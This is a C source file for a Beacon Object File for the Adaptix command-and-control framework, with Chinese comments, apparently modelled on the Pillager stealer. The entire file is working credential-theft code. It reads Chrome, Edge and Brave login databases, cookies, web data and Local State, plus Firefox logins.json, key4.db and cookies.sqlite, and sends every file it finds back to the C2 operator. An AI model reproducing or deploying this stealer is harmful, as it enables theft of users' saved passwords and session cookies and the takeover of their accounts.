/*
 * pillager_mini — Adaptix Beacon BOF
 * 参考 Pillager（浏览器凭证/状态收集）思路：仅只读抓取原始文件并通过 AxDownloadMemory 回传。
 * 不做 DPAPI/AES/SQLite 解密；浏览器占用时可能打开失败。
 *
 * 参数（BeaconData，4 字节 int，位掩码；0 或未提供 = 全开）：
 *   1 Chrome  2 Edge  4 Brave  8 Firefox
 */
#include <windows.h>
#include "beacon.h"
#include "adaptix.h"

#define MASK_CHROME  1
#define MASK_EDGE    2
#define MASK_BRAVE   4
#define MASK_FIREFOX 8

WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR n, LPSTR b, DWORD s);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD da, DWORD sm,
    LPSECURITY_ATTRIBUTES sa, DWORD cd, DWORD fa, HANDLE tf);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE h, LPDWORD hi);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE h, LPVOID b, DWORD n, LPDWORD r, LPOVERLAPPED o);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE h);
WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR n, LPWIN32_FIND_DATAA d);
WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileA(HANDLE h, LPWIN32_FIND_DATAA d);
WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE h);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE h, DWORD f, SIZE_T n);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE h, DWORD f, LPVOID p);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);

WINBASEAPI int __cdecl MSVCRT$_snprintf(char *d, size_t c, const char *f, ...);
WINBASEAPI int __cdecl MSVCRT$sprintf(char *d, const char *f, ...);

static int path_join(char *out, size_t outsz, const char *a, const char *b) {
	int n = MSVCRT$_snprintf(out, outsz, "%s\\%s", a, b);
	return (n > 0 && (size_t)n < outsz) ? 0 : -1;
}

static BOOL file_exists(const char *path) {
	HANDLE h = KERNEL32$CreateFileA(path, GENERIC_READ,
	    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
	    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return FALSE;
	KERNEL32$CloseHandle(h);
	return TRUE;
}

/* 读取整文件并 AxDownloadMemory；成功返回 TRUE */
static BOOL grab_file(const char *fullpath, const char *download_name) {
	HANDLE h = KERNEL32$CreateFileA(fullpath, GENERIC_READ,
	    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
	    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD sz = KERNEL32$GetFileSize(h, NULL);
	if (sz == INVALID_FILE_SIZE || sz == 0) {
		KERNEL32$CloseHandle(h);
		return FALSE;
	}
	/* 合理上限，避免异常大文件拖垮 beacon */
	if (sz > 200u * 1024u * 1024u) {
		KERNEL32$CloseHandle(h);
		BeaconPrintf(CALLBACK_OUTPUT, "[!] skip (too large): %s", download_name);
		return FALSE;
	}

	char *buf = (char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
	if (!buf) {
		KERNEL32$CloseHandle(h);
		return FALSE;
	}
	DWORD rd = 0;
	if (!KERNEL32$ReadFile(h, buf, sz, &rd, NULL) || rd != sz) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buf);
		KERNEL32$CloseHandle(h);
		return FALSE;
	}
	KERNEL32$CloseHandle(h);
	AxDownloadMemory((char *)download_name, buf, (int)sz);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buf);
	return TRUE;
}

static void grab_chromium_family(const char *tag, const char *userDataRoot, int mask, int want) {
	if (!(mask & want))
		return;

	char base[520];
	char path[600];
	char name[280];

	if (path_join(base, sizeof(base), userDataRoot, "User Data") != 0)
		return;

	/* Local State 在 User Data 根目录 */
	if (path_join(path, sizeof(path), base, "Local State") == 0 && file_exists(path)) {
		MSVCRT$sprintf(name, "%s_Local_State", tag);
		if (grab_file(path, name))
			BeaconPrintf(CALLBACK_OUTPUT, "[+] %s", name);
	}

	char defpath[600];
	if (path_join(defpath, sizeof(defpath), base, "Default") != 0)
		return;

	struct {
		const char *rel;
		const char *suffix;
	} items[] = {
		{ "Login Data", "Login_Data" },
		{ "Cookies", "Cookies" },
		{ "Network\\Cookies", "Network_Cookies" },
		{ "Web Data", "Web_Data" },
	};

	for (unsigned i = 0; i < sizeof(items) / sizeof(items[0]); i++) {
		if (path_join(path, sizeof(path), defpath, items[i].rel) != 0)
			continue;
		if (!file_exists(path))
			continue;
		MSVCRT$sprintf(name, "%s_Default_%s", tag, items[i].suffix);
		if (grab_file(path, name))
			BeaconPrintf(CALLBACK_OUTPUT, "[+] %s", name);
	}
}

static void grab_firefox_profiles(const char *appdata, int mask) {
	if (!(mask & MASK_FIREFOX))
		return;

	char prof_root[520];
	char search[530];
	char prof_path[600];
	char file_path[650];
	char name[320];

	if (path_join(prof_root, sizeof(prof_root), appdata, "Mozilla\\Firefox\\Profiles") != 0)
		return;
	if (MSVCRT$_snprintf(search, sizeof(search), "%s\\*", prof_root) <= 0)
		return;

	WIN32_FIND_DATAA fd;
	HANDLE h = KERNEL32$FindFirstFileA(search, &fd);
	if (h == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_OUTPUT, "[i] no Firefox Profiles under %s", prof_root);
		return;
	}

	const char *files[] = { "logins.json", "key4.db", "cert9.db", "cookies.sqlite" };

	do {
		if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			continue;
		if (fd.cFileName[0] == '.')
			continue;
		if (path_join(prof_path, sizeof(prof_path), prof_root, fd.cFileName) != 0)
			continue;

		for (unsigned j = 0; j < sizeof(files) / sizeof(files[0]); j++) {
			if (path_join(file_path, sizeof(file_path), prof_path, files[j]) != 0)
				continue;
			if (!file_exists(file_path))
				continue;
			MSVCRT$sprintf(name, "Firefox_%s_%s", fd.cFileName, files[j]);
			/* 文件名里的反斜杠等已避免 */
			if (grab_file(file_path, name))
				BeaconPrintf(CALLBACK_OUTPUT, "[+] %s", name);
		}
	} while (KERNEL32$FindNextFileA(h, &fd));
	KERNEL32$FindClose(h);
}

void go(char *args, int alen) {
	datap parser;
	int mask = 0xF;

	BeaconDataParse(&parser, args, alen);
	if (parser.length >= 4)
		mask = BeaconDataInt(&parser);
	if (mask == 0)
		mask = 0xF;

	char local[520] = { 0 };
	char appdata[520] = { 0 };

	if (!KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", local, sizeof(local) - 1)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] LOCALAPPDATA missing");
		return;
	}
	if (!KERNEL32$GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata) - 1)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] APPDATA missing");
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[*] pillager_mini mask=0x%x (1=Chrome 2=Edge 4=Brave 8=Firefox)", mask);

	if (mask & MASK_CHROME) {
		char root[520];
		if (path_join(root, sizeof(root), local, "Google\\Chrome") == 0)
			grab_chromium_family("Chrome", root, mask, MASK_CHROME);
	}
	if (mask & MASK_EDGE) {
		char root[520];
		if (path_join(root, sizeof(root), local, "Microsoft\\Edge") == 0)
			grab_chromium_family("Edge", root, mask, MASK_EDGE);
	}
	if (mask & MASK_BRAVE) {
		char root[520];
		if (path_join(root, sizeof(root), local, "BraveSoftware\\Brave-Browser") == 0)
			grab_chromium_family("Brave", root, mask, MASK_BRAVE);
	}

	grab_firefox_profiles(appdata, mask);

	BeaconPrintf(CALLBACK_OUTPUT, "[*] pillager_mini done");
}
